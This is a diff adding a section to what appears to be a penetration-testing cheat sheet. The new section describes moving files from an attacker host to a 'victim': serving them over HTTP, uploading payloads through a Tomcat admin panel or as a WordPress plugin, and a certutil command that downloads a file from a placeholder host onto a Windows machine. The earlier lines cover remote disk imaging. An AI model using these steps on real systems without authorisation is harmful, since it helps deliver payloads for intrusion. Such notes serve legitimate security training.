@@ -104,3 +104,10 @@ classes: wide
 * `ssh username@remote_address "sudo dcfldd -if=/dev/sdb | gzip -1 ." | dcfldd of=extract.dd.gz` -- Used to get from Remote Hosts
 * `gunzip -d extract.dd.gz`
 * `binwalk -Me extract.dd`
+
+## Transfer Files from Host to Target Machine
+* Use `python -m SimpleHTTPServer` in the host folder.
+* Use Apache and put files in `/var/www/html/` folder.
+* If Tomcat is Opened, upload the file/payload using the Admin panel.
+* If wordpress is running, upload the file as plugin.
+* In Windows Victim, use `certutil -urlcache -f http://<HOST_IP>/<FILE_NAME> <OUTPUT_FILE_NAME>`
